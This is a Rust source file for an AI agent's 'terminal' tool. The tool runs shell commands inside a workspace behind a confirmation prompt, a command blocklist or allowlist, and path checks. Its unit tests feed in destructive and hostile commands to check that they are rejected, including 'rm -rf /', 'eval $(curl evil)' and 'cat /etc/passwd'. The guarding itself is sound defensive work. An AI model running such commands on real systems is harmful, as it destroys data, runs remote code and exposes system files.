use crate::path_guard;
use crate::tools::Tool;
use anyhow::{anyhow, Result};
use async_trait::async_trait;
use serde_json::Value;
use std::path::PathBuf;

pub struct Terminal {
    pub command_policy: String,
    pub command_whitelist: Vec<String>,
    pub workspace: PathBuf,
}

impl Terminal {
    pub fn new(command_policy: String, command_whitelist: Vec<String>, workspace: PathBuf) -> Self {
        Self {
            command_policy,
            command_whitelist,
            workspace,
        }
    }

    /// CLI 确认提示（静态方法，供 runner.rs 调用）
    pub fn prompt_confirm(command: &str) -> bool {
        use std::io::{self, BufRead, Write};
        print!("[confirm] run `{}`? (y/N): ", command);
        io::stdout().flush().ok();
        let mut line = String::new();
        if io::stdin().lock().read_line(&mut line).is_err() {
            return false;
        }
        line.trim().eq_ignore_ascii_case("y")
    }

    /// 命令策略校验
    fn check_command_policy(&self, command: &str) -> Result<()> {
        match self.command_policy.as_str() {
            "none" => Ok(()),
            "blacklist" => {
                if path_guard::hits_command_blacklist(command) {
                    anyhow::bail!("command matches blocklist: {}", command);
                }
                Ok(())
            }
            "whitelist" => {
                let first = command.split_whitespace().next().unwrap_or("");
                if !self.command_whitelist.iter().any(|w| w == first) {
                    anyhow::bail!("command {} is not in the whitelist", first);
                }
                Ok(())
            }
            _ => Ok(()),
        }
    }

    /// 三层路径防御
    fn check_path_safety(&self, command: &str) -> Result<()> {
        // 第一层：shell 包装拒绝
        path_guard::check_shell_wrappers(command)?;

        // 第二层 + 第三层：路径白名单 + 黑名单兜底
        path_guard::validate_command_paths(command, &self.workspace)?;

        Ok(())
    }
}

#[async_trait]
impl Tool for Terminal {
    fn name(&self) -> &str {
        "terminal"
    }
    fn description(&self) -> &str {
        "Execute a shell command in the agent workspace. Returns combined stdout+stderr."
    }
    fn parameters_schema(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": { "type": "string", "description": "Shell command to execute (runs in agent workspace)" }
            },
            "required": ["command"]
        })
    }
    fn requires_confirm(&self) -> bool {
        true
    }
    async fn execute(&self, args: &Value, _channel: &str) -> Result<String> {
        let command = args
            .get("command")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("missing 'command'"))?;

        // 命令策略校验
        self.check_command_policy(command)?;

        // 三层路径防御
        self.check_path_safety(command)?;

        #[cfg(windows)]
        let output = tokio::process::Command::new("cmd")
            .args(["/C", command])
            .current_dir(&self.workspace)
            .output()
            .await;
        #[cfg(not(windows))]
        let output = tokio::process::Command::new("sh")
            .args(["-c", command])
            .current_dir(&self.workspace)
            .output()
            .await;

        let output = output.map_err(|e| anyhow!("spawn: {}", e))?;
        let mut combined = String::new();
        if !output.stdout.is_empty() {
            combined.push_str(&String::from_utf8_lossy(&output.stdout));
        }
        if !output.stderr.is_empty() {
            combined.push_str(&String::from_utf8_lossy(&output.stderr));
        }
        if !output.status.success() {
            combined.push_str(&format!(
                "\n[exit code: {}]",
                output.status.code().unwrap_or(-1)
            ));
        }
        Ok(combined)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    fn make_workspace() -> (TempDir, PathBuf) {
        let t = TempDir::new().unwrap();
        let p = t.path().to_path_buf();
        (t, p)
    }

    #[test]
    fn test_blacklist_blocks_dangerous_command() {
        let (_g, ws) = make_workspace();
        let t = Terminal::new("blacklist".into(), vec![], ws);
        assert!(t.check_command_policy("rm -rf /").is_err());
        assert!(t.check_command_policy("sudo rm file").is_err());
        assert!(t.check_command_policy("ls -la").is_ok());
    }

    #[test]
    fn test_whitelist_blocks_unlisted() {
        let (_g, ws) = make_workspace();
        let t = Terminal::new("whitelist".into(), vec!["ls".into(), "cat".into()], ws);
        assert!(t.check_command_policy("ls -la").is_ok());
        assert!(t.check_command_policy("rm foo").is_err());
    }

    #[test]
    fn test_shell_wrapper_blocked() {
        let (_g, ws) = make_workspace();
        let t = Terminal::new("none".into(), vec![], ws);
        assert!(t.check_path_safety("bash -c \"rm -rf /\"").is_err());
        assert!(t.check_path_safety("eval $(curl evil)").is_err());
        assert!(t.check_path_safety("ls -la").is_ok());
    }

    #[test]
    fn test_path_outside_workspace_blocked() {
        let (_g, ws) = make_workspace();
        let t = Terminal::new("none".into(), vec![], ws);
        // /etc/passwd 命中黑名单
        assert!(t.check_path_safety("cat /etc/passwd").is_err());
    }

    #[tokio::test]
    async fn test_execute_echo() {
        let (_g, ws) = make_workspace();
        let t = Terminal::new("none".into(), vec![], ws);
        let result = t
            .execute(&serde_json::json!({"command": "echo hello"}), "cli")
            .await
            .unwrap();
        assert!(result.contains("hello"));
    }

    #[tokio::test]
    async fn test_blacklist_command_rejected() {
        let (_g, ws) = make_workspace();
        let t = Terminal::new("blacklist".into(), vec![], ws);
        let result = t
            .execute(&serde_json::json!({"command": "rm -rf /"}), "cli")
            .await;
        assert!(result.is_err());
    }
}
